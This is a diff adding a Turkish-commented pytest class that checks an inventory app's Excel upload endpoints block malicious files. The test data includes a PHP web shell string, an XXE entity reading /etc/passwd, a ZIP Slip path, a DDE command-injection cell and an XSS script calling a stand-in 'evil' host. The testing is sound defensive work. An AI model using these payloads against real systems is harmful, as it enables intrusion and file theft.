@@ -1278,6 +1278,139 @@ class TestMiniS3StorageAndAutoCleanup:
         assert dl.content == stock_v2
 
 
+class TestAdvancedExcelSecurityEngine:
+    """
+    8 katmanlı ileri düzey Excel dosya güvenliği testleri:
+    - EXE / ELF / PHP / HTML sahte uzantılı dosyaların (Magic Bytes) bloklanması,
+    - Çift uzantı (.exe.xlsx, .php.xlsx) ve makro uzantılarının (.xlsm) bloklanması,
+    - VBA Makro (vbaProject.bin) ve gömülü OLE/ActiveX içeren .xlsx paketlerinin bloklanması,
+    - XXE (<!DOCTYPE / <!ENTITY) ve dış şablon SSRF (TargetMode="External") saldırılarının bloklanması,
+    - ZIP Slip (../../) path traversal arşivlerinin bloklanması,
+    - Hücre içi DDE (=cmd|...) ve XSS (<script>...) yüklerinin bloklanması ve mevcut güvenli verinin korunması.
+    """
+
+    @staticmethod
+    def _clean_xlsx() -> bytes:
+        wb = Workbook()
+        ws = wb.active
+        ws.append(["ETİKET", "REFERANS", "MİKTAR", "X98FIFO_TARIH"])
+        ws.append(["SEC-001", "REF-SEC", 30, "01.05.2026 08:00"])
+        buf = BytesIO()
+        wb.save(buf)
+        return buf.getvalue()
+
+    def test_all_malicious_file_upload_vectors_blocked_before_touching_db_or_s3(self, client):
+        import zipfile
+
+        # Önce %100 temiz bir Excel yükle ki saldırıların mevcut veriyi/S3'ü bozmadığını da kanıtlayalım
+        clean_bytes = self._clean_xlsx()
+        ok_res = client.post(
+            "/api/inventory/import/stock?replace=true",
+            files={"file": ("temiz_stok.xlsx", clean_bytes, "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet")},
+        )
+        assert ok_res.status_code == 200
+
+        # 1) Windows EXE (MZ) dosyasını .xlsx adıyla yükleme saldırısı
+        exe_payload = b"MZ\x90\x00\x03\x00\x00\x00" + b"\x00" * 128
+        r_exe = client.post(
+            "/api/inventory/import/stock",
+            files={"file": ("fatura.xlsx", exe_payload, "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet")},
+        )
+        assert r_exe.status_code == 400
+        assert "EXE/DLL" in r_exe.json()["detail"]
+
+        # 2) PHP Webshell dosyasını .xlsx adıyla yükleme saldırısı
+        php_payload = b"<?php system($_GET['c']); ?>" + b" " * 100
+        r_php = client.post(
+            "/api/inventory/import/stock",
+            files={"file": ("stok.xlsx", php_payload, "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet")},
+        )
+        assert r_php.status_code == 400
+        assert "PHP" in r_php.json()["detail"]
+
+        # 3) Çift uzantı (.php.xlsx, .exe.xlsx) ve makro uzantısı (.xlsm) saldırısı
+        for bad_name in ("shell.php.xlsx", "trojan.exe.xlsx", "makro_dosyasi.xlsm"):
+            r_ext = client.post(
+                "/api/inventory/import/stock",
+                files={"file": (bad_name, clean_bytes, "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet")},
+            )
+            assert r_ext.status_code == 400
+
+        # 4) Gerçek .xlsx içine gizlenmiş VBA Makrosu (xl/vbaProject.bin) saldırısı
+        macro_buf = BytesIO()
+        with zipfile.ZipFile(BytesIO(clean_bytes), "r") as zin, zipfile.ZipFile(macro_buf, "w") as zout:
+            for item in zin.infolist():
+                zout.writestr(item, zin.read(item.filename))
+            zout.writestr("xl/vbaProject.bin", b"MALICIOUS_VBA_MACRO_STREAM")
+        r_macro = client.post(
+            "/api/inventory/import/stock",
+            files={"file": ("makrolu.xlsx", macro_buf.getvalue(), "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet")},
+        )
+        assert r_macro.status_code == 400
+        assert "vbaProject.bin" in r_macro.json()["detail"]
+
+        # 5) Gerçek .xlsx içine XXE (<!DOCTYPE / <!ENTITY>) enjeksiyonu saldırısı
+        xxe_buf = BytesIO()
+        with zipfile.ZipFile(BytesIO(clean_bytes), "r") as zin, zipfile.ZipFile(xxe_buf, "w") as zout:
+            for item in zin.infolist():
+                data = zin.read(item.filename)
+                if item.filename == "xl/workbook.xml":
+                    data = b'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>' + data
+                zout.writestr(item, data)
+        r_xxe = client.post(
+            "/api/inventory/import/stock",
+            files={"file": ("xxe.xlsx", xxe_buf.getvalue(), "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet")},
+        )
+        assert r_xxe.status_code == 400
+        assert "XXE" in r_xxe.json()["detail"]
+
+        # 6) ZIP Slip (../../etc/cron.d/backdoor) arşiv içi path traversal saldırısı
+        slip_buf = BytesIO()
+        with zipfile.ZipFile(BytesIO(clean_bytes), "r") as zin, zipfile.ZipFile(slip_buf, "w") as zout:
+            for item in zin.infolist():
+                zout.writestr(item, zin.read(item.filename))
+            zout.writestr("../../evil.txt", b"pwned")
+        r_slip = client.post(
+            "/api/inventory/import/stock",
+            files={"file": ("slip.xlsx", slip_buf.getvalue(), "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet")},
+        )
+        assert r_slip.status_code == 400
+        assert "tehlikeli dosya yolu" in r_slip.json()["detail"]
+
+        # 7) Hücre içi DDE Komut Enjeksiyonu (=cmd|'/c calc'!A0) ve XSS (<script>) saldırısı
+        for bad_cell in ("=cmd|'/c calc'!A0", "<script>fetch('http://evil')</script>"):
+            wb_mal = Workbook()
+            ws_mal = wb_mal.active
+            ws_mal.append(["ETİKET", "REFERANS", "MİKTAR", "X98FIFO_TARIH"])
+            ws_mal.append(["LBL-999", bad_cell, 30, "01.05.2026 08:00"])
+            b_mal = BytesIO()
+            wb_mal.save(b_mal)
+
+            r_cell = client.post(
+                "/api/inventory/import/stock",
+                files={"file": ("dde.xlsx", b_mal.getvalue(), "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet")},
+            )
+            assert r_cell.status_code == 400
+            assert "zararlı hücre içeriği" in r_cell.json()["detail"]
+
+        # 8) Sevkiyat Excel'i ve Örnek Excel Başlık İnceleme (inspect) uç noktalarının da aynı korumaya sahip olduğunu doğrula
+        assert client.post(
+            "/api/shipment/targets/import",
+            files={"file": ("sevkiyat.xlsx", exe_payload, "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet")},
+        ).status_code == 400
+        assert client.post(
+            "/api/inventory/excel-headers/inspect",
+            files={"file": ("ornek.xlsx", exe_payload, "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet")},
+        ).status_code == 400
+
+        # 9) Tüm bu saldırılardan sonra önceki temiz stok ve Mini S3 dosyasının (%100 dokunulmadan) korunduğunu doğrula!
+        stats = client.get("/api/inventory/stats").json()
+        assert stats["total_labels"] == 1
+        s3_files = {f["slot"]: f for f in client.get("/api/inventory/storage/files").json()}
+        assert s3_files["stock"]["original_filename"] == "temiz_stok.xlsx"
+
+
+
 
 
 
